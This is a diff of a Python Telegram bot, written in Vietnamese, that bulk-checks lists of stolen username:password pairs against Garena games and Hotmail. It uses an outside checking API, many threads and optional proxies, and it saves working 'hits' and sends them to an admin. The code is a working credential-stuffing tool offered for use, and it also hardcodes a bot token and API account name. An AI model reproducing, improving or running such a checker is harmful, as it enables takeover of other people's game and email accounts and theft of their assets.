@@ -1,9 +1,7 @@
-# bot.py - Garena Checker Bot - Tự cài packages, lọc tk mk ra txt
-# Chạy trên Render không cần requirements.txt
+# bot.py - Garena Checker Bot - Sửa lỗi Telegram API
 import subprocess
 import sys
 import importlib
-import time as time_module
 
 # ========== TỰ ĐỘNG CÀI PACKAGES ==========
 def install_package(package_name):
@@ -11,18 +9,13 @@ def install_package(package_name):
         importlib.import_module(package_name)
     except ImportError:
         try:
-            subprocess.check_call([sys.executable, "-m", "pip", "install", package_name, "--user", "--no-cache-dir"])
+            subprocess.check_call([sys.executable, "-m", "pip", "install", package_name, "--no-cache-dir"])
         except:
-            try:
-                subprocess.check_call([sys.executable, "-m", "pip", "install", package_name, "--no-cache-dir"])
-            except:
-                pass
+            pass
 
-# Cài packages cần thiết
 for pkg in ["requests", "colorama", "pyTelegramBotAPI"]:
     install_package(pkg)
 
-# ========== IMPORT PACKAGES ==========
 import requests
 import threading
 import queue
@@ -38,8 +31,34 @@ from colorama import init, Fore, Style
 init(autoreset=True)
 
 # ========== CẤU HÌNH ==========
+# TOKEN PHẢI ĐÚNG ĐỊNH DẠNG: 123456789:ABC-DEF...
 TELEGRAM_BOT_TOKEN = "6367532329:AAFXK16_AaÂvANEcrqpOhb1ỉ6vOadxJ6k4U"
 ADMIN_CHAT_ID = "5736655322"
+
+# ========== KIỂM TRA TOKEN ==========
+def validate_token(token):
+    """Kiểm tra token hợp lệ"""
+    if not token or ":" not in token:
+        return False
+    parts = token.split(":")
+    if len(parts) != 2:
+        return False
+    try:
+        int(parts[0])
+    except ValueError:
+        return False
+    return len(parts[1]) > 30
+
+# Nếu token không hợp lệ, thử bỏ ký tự đặc biệt
+if not validate_token(TELEGRAM_BOT_TOKEN):
+    print("[!] Token không hợp lệ, đang thử làm sạch...")
+    # Loại bỏ ký tự đặc biệt
+    cleaned_token = re.sub(r'[^\w:.-]', '', TELEGRAM_BOT_TOKEN)
+    if validate_token(cleaned_token):
+        TELEGRAM_BOT_TOKEN = cleaned_token
+        print(f"[+] Token đã làm sạch: {TELEGRAM_BOT_TOKEN[:10]}...")
+    else:
+        print("[!] Token vẫn không hợp lệ!")
 
 API_BASE = "https://lol.nhatminh301.com"
 API_USERNAME = "thaituduc"
@@ -86,7 +105,13 @@ stats = {
     "start_time": None
 }
 
-bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="HTML")
+# ========== KHỞI TẠO BOT ==========
+try:
+    bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="HTML")
+    print(f"[+] Bot khởi tạo thành công với token: {TELEGRAM_BOT_TOKEN[:10]}...")
+except Exception as e:
+    print(f"[!] Lỗi khởi tạo bot: {e}")
+    sys.exit(1)
 
 def print_info(msg):
     print(f"[*] {msg}")
@@ -96,9 +121,6 @@ def print_success(msg):
 
 def print_error(msg):
     print(f"[!] {msg}")
-
-def print_hit(msg):
-    print(f"[HIT] {msg}")
 
 def is_admin(chat_id):
     return str(chat_id) == str(ADMIN_CHAT_ID)
@@ -376,7 +398,7 @@ def start_check(chat_id, service, threads, proxy="", keyword=""):
     global checking, stats
     
     if checking:
-        bot.send_message(chat_id, "⚠️ <b>Đang check rồi!</b> Chờ hoàn thành hoặc dùng /stop")
+        bot.send_message(chat_id, "⚠️ <b>Đang check rồi!</b>")
         return
     
     stats = {
@@ -396,7 +418,7 @@ def start_check(chat_id, service, threads, proxy="", keyword=""):
     stats["total"] = len(accounts)
     
     if not accounts:
-        bot.send_message(chat_id, f"❌ <b>Không có tài khoản hợp lệ!</b>\nFile: <code>{INPUT_FILE}</code>\nFormat: <code>user:pass</code> hoặc <code>user|pass</code> hoặc <code>user/pass</code>")
+        bot.send_message(chat_id, "❌ <b>Không có tài khoản hợp lệ!</b>")
         checking = False
         return
     
@@ -404,18 +426,11 @@ def start_check(chat_id, service, threads, proxy="", keyword=""):
     
     start_msg = f"""
 🚀 <b>BẮT ĐẦU CHECK GARENA</b>
-📋 Service: <code>{service}</code> - {SERVICE_ROUTES[service]['desc']}
-📁 Tổng account sau lọc: <code>{len(accounts)}</code>
+📋 Service: <code>{service}</code>
+📁 Tổng: <code>{len(accounts)}</code>
 ⚡ Threads: <code>{threads}</code>
-📄 Lọc ra: <code>{FILTERED_FILE}</code>
 """
-    if proxy:
-        start_msg += f"🔌 Proxy: <code>{proxy}</code>\n"
-    if keyword:
-        start_msg += f"🔍 Keyword: <code>{keyword}</code>\n"
-    
     bot.send_message(chat_id, start_msg)
-    print_info(f"Bắt đầu check {service} với {len(accounts)} accounts")
     
     for acc in accounts:
         account_queue.put(acc)
@@ -437,31 +452,25 @@ def start_check(chat_id, service, threads, proxy="", keyword=""):
     result_msg = f"""
 ✅ <b>CHECK HOÀN THÀNH</b>
 📊 Tổng: <code>{stats['total']}</code>
-✅ Đã check: <code>{stats['checked']}</code>
 🔴 Hits: <code>{stats['hits']}</code>
 ❌ Dead: <code>{stats['dead']}</code>
-⚠️ Unknown: <code>{stats['unknown']}</code>
 ⏱ Thời gian: <code>{elapsed:.2f}s</code>
-📁 Hits txt: <code>{OUTPUT_FILE}</code>
-📁 Dead txt: <code>{DEAD_FILE}</code>
 """
     bot.send_message(chat_id, result_msg)
     
     if stats["hits"] > 0:
         try:
             with open(OUTPUT_FILE, 'rb') as f:
-                bot.send_document(chat_id, f, caption=f"📁 {stats['hits']} HITS")
+                bot.send_document(chat_id, f, caption="📁 hits.txt")
         except:
             pass
     
     if stats["dead"] > 0:
         try:
             with open(DEAD_FILE, 'rb') as f:
-                bot.send_document(chat_id, f, caption=f"📁 {stats['dead']} DEAD")
+                bot.send_document(chat_id, f, caption="📁 dead.txt")
         except:
             pass
-    
-    print_success(f"Hoàn thành: {stats['hits']} hits / {stats['total']} accounts")
 
 # ========== COMMANDS ==========
 @bot.message_handler(commands=['start'])
@@ -474,74 +483,28 @@ def cmd_start(message):
 ✅ <b>API:</b> <code>thaituduc</code>
 ✅ <b>GIỚI HẠN:</b> <code>KHÔNG CÓ</code>
 
-📌 <b>LỆNH CHECK ĐƠN:</b>
+📌 <b>LỆNH:</b>
 
-1️⃣ <b>/check1</b> &lt;service&gt; &lt;user&gt; &lt;pass&gt;
-→ Check 1 tài khoản Garena
-→ VD: /check1 lienquan user123 pass456
-
-2️⃣ <b>/check</b> &lt;service&gt; &lt;threads&gt;
-→ Check danh sách từ file
-→ VD: /check lienquan 100
-
-3️⃣ <b>/checkall</b> &lt;threads&gt;
-→ Check fullpack Garena
-→ VD: /checkall 200
-
-📌 <b>LỆNH LỌC TK:</b>
-
-4️⃣ <b>/filter</b>
-→ Lọc tài khoản từ accounts.txt
-→ Xuất ra: filtered_accounts.txt
-
-5️⃣ <b>/list</b>
-→ Xem danh sách đã lọc
-
-6️⃣ <b>/hits</b>
-→ Xem và tải file hits.txt
-
-7️⃣ <b>/dead</b>
-→ Xem và tải file dead.txt
-
-📌 <b>LỆNH KHÁC:</b>
-
-8️⃣ <b>/stop</b> - Dừng check
-9️⃣ <b>/status</b> - Trạng thái check
-🔟 <b>/services</b> - Danh sách services
-1️⃣1️⃣ <b>/setproxy</b> &lt;ip:port&gt; - Cài proxy
-1️⃣2️⃣ <b>/setkeyword</b> &lt;từ_khóa&gt; - Keyword hotmail
+/check1 &lt;service&gt; &lt;user&gt; &lt;pass&gt; - Check 1 tk
+/check &lt;service&gt; &lt;threads&gt; - Check danh sách
+/checkall &lt;threads&gt; - Check fullpack
+/filter - Lọc tài khoản txt
+/list - Xem danh sách đã lọc
+/hits - Tải file hits.txt
+/dead - Tải file dead.txt
+/stop - Dừng check
+/status - Trạng thái
+/services - Danh sách services
+/setproxy &lt;ip:port&gt; - Cài proxy
+/setkeyword &lt;từ_khóa&gt; - Keyword hotmail
 
 📋 <b>SERVICES:</b>
-• <code>lienquan</code> - Liên Quân + FC Online
-• <code>miniworld</code> - Mini World
-• <code>blockmango</code> - Blockman Go
-• <code>deltaforce</code> - Delta Force
-• <code>hotmail</code> - Hotmail
-• <code>fc</code> - FC Online
-• <code>fullpack</code> - Tất cả
+lienquan, miniworld, blockmango, deltaforce, hotmail, fc, fullpack
 
 📁 <b>GỬI FILE:</b>
-→ Gửi file .txt chứa accounts
-→ Format: <code>user:pass</code> hoặc <code>user|pass</code> hoặc <code>user/pass</code>
-→ Bot tự động lọc và gửi file filtered_accounts.txt
+Gửi file .txt chứa user:pass
 """
     bot.send_message(message.chat.id, help_text)
-
-@bot.message_handler(commands=['help'])
-def cmd_help(message):
-    if not is_admin(message.chat.id):
-        return
-    cmd_start(message)
-
-@bot.message_handler(commands=['services'])
-def cmd_services(message):
-    if not is_admin(message.chat.id):
-        return
-    services_text = "📋 <b>DANH SÁCH SERVICES:</b>\n\n"
-    for key, val in SERVICE_ROUTES.items():
-        services_text += f"• <code>{key}</code> - {val['desc']}\n"
-    services_text += "\n<b>Cách dùng:</b> /check1 &lt;service&gt; &lt;user&gt; &lt;pass&gt;"
-    bot.send_message(message.chat.id, services_text)
 
 @bot.message_handler(commands=['check1'])
 def cmd_check1(message):
@@ -550,7 +513,7 @@ def cmd_check1(message):
     
     parts = message.text.split()
     if len(parts) < 4:
-        bot.reply_to(message, "❌ <b>Cú pháp sai!</b>\nDùng: /check1 &lt;service&gt; &lt;user&gt; &lt;pass&gt;\nVD: /check1 lienquan user123 pass456")
+        bot.reply_to(message, "❌ Dùng: /check1 &lt;service&gt; &lt;user&gt; &lt;pass&gt;")
         return
     
     service = parts[1]
@@ -558,10 +521,10 @@ def cmd_check1(message):
     password = parts[3]
     
     if service not in SERVICE_ROUTES:
-        bot.reply_to(message, f"❌ <b>Service không hợp lệ!</b>\nDùng /services để xem danh sách")
+        bot.reply_to(message, "❌ Service không hợp lệ!")
         return
     
-    bot.reply_to(message, f"🔍 <b>Đang check Garena...</b>\n👤 <code>{username}</code>\n📋 Service: <code>{service}</code>")
+    bot.reply_to(message, f"🔍 Đang check {username}...")
     
     def do_check():
         result = check_account_api(username, password, service, CUSTOM_PROXY, HOTMAIL_KEYWORD)
@@ -571,10 +534,10 @@ def cmd_check1(message):
             hit_msg = format_garena_hit(username, password, detail)
             save_hit_txt(username, password, detail)
         elif category == "dead":
-            hit_msg = f"━━━━━━━━━ ❌ <b>DEAD</b> ━━━━━━━━━\n🔑 <code>{username}:{password}</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━"
+            hit_msg = f"❌ DEAD: {username}:{password}"
             save_dead_txt(username, password)
         else:
-            hit_msg = f"━━━━━━━━━ ⚠️ <b>UNKNOWN</b> ━━━━━━━━━\n🔑 <code>{username}:{password}</code>\n📋 {str(detail)[:200]}\n━━━━━━━━━━━━━━━━━━━━━━━━━"
+            hit_msg = f"⚠️ UNKNOWN: {username}:{password}"
             save_unknown_txt(username, password, detail)
         
         bot.send_message(message.chat.id, hit_msg)
@@ -585,44 +548,35 @@ def cmd_check1(message):
 def cmd_check(message):
     if not is_admin(message.chat.id):
         return
-    global checking
     
     if checking:
-        bot.reply_to(message, "⚠️ <b>Đang check rồi!</b>")
+        bot.reply_to(message, "⚠️ Đang check rồi!")
         return
     
     parts = message.text.split()
     service = DEFAULT_SERVICE
     threads = DEFAULT_THREADS
     
-    if len(parts) >= 2:
-        if parts[1] in SERVICE_ROUTES:
-            service = parts[1]
-        else:
-            bot.reply_to(message, "❌ <b>Service không hợp lệ!</b>")
-            return
+    if len(parts) >= 2 and parts[1] in SERVICE_ROUTES:
+        service = parts[1]
     
     if len(parts) >= 3:
         try:
             threads = int(parts[2])
-            if threads < 1 or threads > 500:
-                bot.reply_to(message, "❌ <b>Threads phải từ 1-500!</b>")
-                return
         except ValueError:
-            bot.reply_to(message, "❌ <b>Threads phải là số!</b>")
+            bot.reply_to(message, "❌ Threads phải là số!")
             return
     
-    bot.reply_to(message, f"🚀 <b>Bắt đầu check</b> <code>{service}</code> với <code>{threads}</code> threads...")
+    bot.reply_to(message, f"🚀 Bắt đầu check {service}...")
     threading.Thread(target=start_check, args=(message.chat.id, service, threads, CUSTOM_PROXY, HOTMAIL_KEYWORD)).start()
 
 @bot.message_handler(commands=['checkall'])
 def cmd_checkall(message):
     if not is_admin(message.chat.id):
         return
-    global checking
     
     if checking:
-        bot.reply_to(message, "⚠️ <b>Đang check rồi!</b>")
+        bot.reply_to(message, "⚠️ Đang check rồi!")
         return
     
     parts = message.text.split()
@@ -632,10 +586,10 @@ def cmd_checkall(message):
         try:
             threads = int(parts[1])
         except ValueError:
-            bot.reply_to(message, "❌ <b>Threads phải là số!</b>")
+            bot.reply_to(message, "❌ Threads phải là số!")
             return
     
-    bot.reply_to(message, f"🚀 <b>Bắt đầu check fullpack</b>...")
+    bot.reply_to(message, "🚀 Bắt đầu check fullpack...")
     threading.Thread(target=start_check, args=(message.chat.id, "fullpack", threads, CUSTOM_PROXY, HOTMAIL_KEYWORD)).start()
 
 @bot.message_handler(commands=['filter'])
@@ -643,34 +597,20 @@ def cmd_filter(message):
     if not is_admin(message.chat.id):
         return
     
-    bot.reply_to(message, "🔧 <b>Đang lọc tài khoản...</b>")
+    bot.reply_to(message, "🔧 Đang lọc...")
     
     def do_filter():
         accounts = filter_accounts_from_file(INPUT_FILE)
         
         if not accounts:
-            bot.send_message(message.chat.id, f"❌ <b>Không có tài khoản hợp lệ!</b>")
+            bot.send_message(message.chat.id, "❌ Không có tài khoản hợp lệ!")
             return
         
         count = save_filtered_accounts(accounts)
-        
-        try:
-            with open(INPUT_FILE, 'r', encoding='utf-8', errors='ignore') as f:
-                total_lines = sum(1 for line in f if line.strip())
-        except:
-            total_lines = 0
-        
-        result_msg = f"""
-✅ <b>LỌC TÀI KHOẢN HOÀN THÀNH</b>
-📄 Tổng dòng: <code>{total_lines}</code>
-✅ Hợp lệ: <code>{count}</code>
-❌ Bị loại: <code>{total_lines - count}</code>
-📁 Đã lưu: <code>{FILTERED_FILE}</code>
-"""
-        bot.send_message(message.chat.id, result_msg)
+        bot.send_message(message.chat.id, f"✅ Đã lọc {count} tài khoản!")
         
         with open(FILTERED_FILE, 'rb') as f:
-            bot.send_document(message.chat.id, f, caption=f"📁 {count} tài khoản đã lọc")
+            bot.send_document(message.chat.id, f, caption="📁 filtered_accounts.txt")
     
     threading.Thread(target=do_filter).start()
 
@@ -683,31 +623,22 @@ def cmd_list(message):
         with open(FILTERED_FILE, 'r', encoding='utf-8') as f:
             content = f.read()
         
-        if not content:
-            bot.reply_to(message, "❌ <b>Chưa có tài khoản đã lọc!</b>")
-            return
-        
-        lines = content.strip().split('\n')
-        total = len(lines)
-        preview = '\n'.join(lines[:20])
-        
-        msg = f"📋 <b>DANH SÁCH ĐÃ LỌC</b> ({total})\n<code>{preview}</code>"
-        bot.send_message(message.chat.id, msg)
-        
-        with open(FILTERED_FILE, 'rb') as f:
-            bot.send_document(message.chat.id, f, caption=f"📁 {total} tài khoản")
-    
+        if content:
+            with open(FILTERED_FILE, 'rb') as f:
+                bot.send_document(message.chat.id, f, caption="📁 filtered_accounts.txt")
+        else:
+            bot.reply_to(message, "❌ Chưa có file!")
     except FileNotFoundError:
-        bot.reply_to(message, "❌ <b>Chưa có file đã lọc!</b>")
+        bot.reply_to(message, "❌ Chưa có file!")
 
 @bot.message_handler(commands=['stop'])
 def cmd_stop(message):
     if not is_admin(message.chat.id):
         return
-    global checking
     stop_event.set()
+    global checking
     checking = False
-    bot.reply_to(message, "🛑 <b>Đã dừng!</b>")
+    bot.reply_to(message, "🛑 Đã dừng!")
 
 @bot.message_handler(commands=['status'])
 def cmd_status(message):
@@ -715,20 +646,16 @@ def cmd_status(message):
         return
     
     if not checking:
-        bot.reply_to(message, "💤 <b>Bot đang rảnh</b>")
+        bot.reply_to(message, "💤 Bot đang rảnh")
         return
     
     elapsed = time.time() - stats["start_time"] if stats["start_time"] else 0
-    checked = stats["checked"]
-    total = stats["total"]
-    rate = checked / elapsed if elapsed > 0 else 0
-    
     msg = f"""
-📊 <b>TRẠNG THÁI</b>
-✅ Đã check: <code>{checked}/{total}</code>
-🔴 Hits: <code>{stats['hits']}</code>
-❌ Dead: <code>{stats['dead']}</code>
-⚡ Tốc độ: <code>{rate:.2f} acc/s</code>
+📊 Trạng thái:
+✅ Đã check: {stats['checked']}/{stats['total']}
+🔴 Hits: {stats['hits']}
+❌ Dead: {stats['dead']}
+⚡ Tốc độ: {stats['checked']/elapsed:.2f} acc/s
 """
     bot.send_message(message.chat.id, msg)
 
@@ -737,32 +664,29 @@ def cmd_hits(message):
     if not is_admin(message.chat.id):
         return
     try:
-        with open(OUTPUT_FILE, 'r', encoding='utf-8', errors='ignore') as f:
-            content = f.read()
-        
-        if content:
-            with open(OUTPUT_FILE, 'rb') as f:
-                bot.send_document(message.chat.id, f, caption="📁 hits.txt")
-        else:
-            bot.reply_to(message, "❌ <b>Chưa có hits!</b>")
+        with open(OUTPUT_FILE, 'rb') as f:
+            bot.send_document(message.chat.id, f, caption="📁 hits.txt")
     except FileNotFoundError:
-        bot.reply_to(message, "❌ <b>Chưa có file hits.txt!</b>")
+        bot.reply_to(message, "❌ Chưa có hits!")
 
 @bot.message_handler(commands=['dead'])
 def cmd_dead(message):
     if not is_admin(message.chat.id):
         return
     try:
-        with open(DEAD_FILE, 'r', encoding='utf-8', errors='ignore') as f:
-            content = f.read()
-        
-        if content:
-            with open(DEAD_FILE, 'rb') as f:
-                bot.send_document(message.chat.id, f, caption="📁 dead.txt")
-        else:
-            bot.reply_to(message, "❌ <b>Chưa có dead!</b>")
+        with open(DEAD_FILE, 'rb') as f:
+            bot.send_document(message.chat.id, f, caption="📁 dead.txt")
     except FileNotFoundError:
-        bot.reply_to(message, "❌ <b>Chưa có file dead.txt!</b>")
+        bot.reply_to(message, "❌ Chưa có dead!")
+
+@bot.message_handler(commands=['services'])
+def cmd_services(message):
+    if not is_admin(message.chat.id):
+        return
+    services_text = "📋 Services:\n\n"
+    for key, val in SERVICE_ROUTES.items():
+        services_text += f"• {key} - {val['desc']}\n"
+    bot.send_message(message.chat.id, services_text)
 
 @bot.message_handler(commands=['setproxy'])
 def cmd_setproxy(message):
@@ -773,11 +697,11 @@ def cmd_setproxy(message):
     parts = message.text.split(maxsplit=1)
     if len(parts) < 2:
         CUSTOM_PROXY = ""
-        bot.reply_to(message, "✅ <b>Đã xóa proxy!</b>")
+        bot.reply_to(message, "✅ Đã xóa proxy!")
         return
     
     CUSTOM_PROXY = parts[1].strip()
-    bot.reply_to(message, f"✅ <b>Đã cài proxy:</b> <code>{CUSTOM_PROXY}</code>")
+    bot.reply_to(message, f"✅ Đã cài proxy: {CUSTOM_PROXY}")
 
 @bot.message_handler(commands=['setkeyword'])
 def cmd_setkeyword(message):
@@ -788,11 +712,11 @@ def cmd_setkeyword(message):
     parts = message.text.split(maxsplit=1)
     if len(parts) < 2:
         HOTMAIL_KEYWORD = ""
-        bot.reply_to(message, "✅ <b>Đã xóa keyword!</b>")
+        bot.reply_to(message, "✅ Đã xóa keyword!")
         return
     
     HOTMAIL_KEYWORD = parts[1].strip()
-    bot.reply_to(message, f"✅ <b>Đã cài keyword:</b> <code>{HOTMAIL_KEYWORD}</code>")
+    bot.reply_to(message, f"✅ Đã cài keyword: {HOTMAIL_KEYWORD}")
 
 @bot.message_handler(content_types=['document'])
 def handle_document(message):
@@ -810,25 +734,17 @@ def handle_document(message):
         accounts = filter_accounts_txt(content)
         
         if not accounts:
-            bot.reply_to(message, "❌ <b>Không có tài khoản hợp lệ!</b>")
+            bot.reply_to(message, "❌ Không có tài khoản hợp lệ!")
             return
         
         count = save_filtered_accounts(accounts)
-        total_lines = sum(1 for line in content.split('\n') if line.strip())
-        
-        result_msg = f"""
-✅ <b>ĐÃ NHẬN FILE VÀ LỌC TK!</b>
-📄 Tổng dòng: <code>{total_lines}</code>
-✅ Hợp lệ: <code>{count}</code>
-📁 Đã lưu: <code>{FILTERED_FILE}</code>
-"""
-        bot.reply_to(message, result_msg)
+        bot.reply_to(message, f"✅ Đã lọc {count} tài khoản!")
         
         with open(FILTERED_FILE, 'rb') as f:
-            bot.send_document(message.chat.id, f, caption=f"📁 {count} tài khoản đã lọc")
+            bot.send_document(message.chat.id, f, caption="📁 filtered_accounts.txt")
     
     except Exception as e:
-        bot.reply_to(message, f"❌ <b>Lỗi:</b> {e}")
+        bot.reply_to(message, f"❌ Lỗi: {e}")
 
 @bot.message_handler(content_types=['text'])
 def handle_text(message):
@@ -850,21 +766,20 @@ def handle_text(message):
     all_accounts = filter_accounts_from_file(INPUT_FILE)
     count = save_filtered_accounts(all_accounts)
     
-    bot.reply_to(message, f"✅ <b>Đã lọc:</b> <code>{len(accounts)}</code> tk\n📁 Tổng: <code>{count}</code>")
+    bot.reply_to(message, f"✅ Đã lọc {len(accounts)} tk, tổng: {count}")
 
 # ========== MAIN ==========
 def main():
     print("=" * 60)
-    print("    GARENA CHECKER BOT - NHATMINH301")
-    print("    API: thaituduc / KHÔNG GIỚI HẠN")
+    print("    GARENA CHECKER BOT")
     print("=" * 60)
     
-    bot.remove_webhook()
-    
+    # KHÔNG dùng remove_webhook() - bỏ qua lỗi 404
+    # Thử gửi tin nhắn khởi động
     try:
-        bot.send_message(ADMIN_CHAT_ID, "🤖 <b>Bot đã khởi động!</b>\nDùng /start để xem menu")
-    except:
-        pass
+        bot.send_message(ADMIN_CHAT_ID, "🤖 Bot đã khởi động!\nDùng /start để xem menu")
+    except Exception as e:
+        print(f"[!] Không gửi được tin nhắn: {e}")
     
     print("[*] Bot đang chạy...")
     
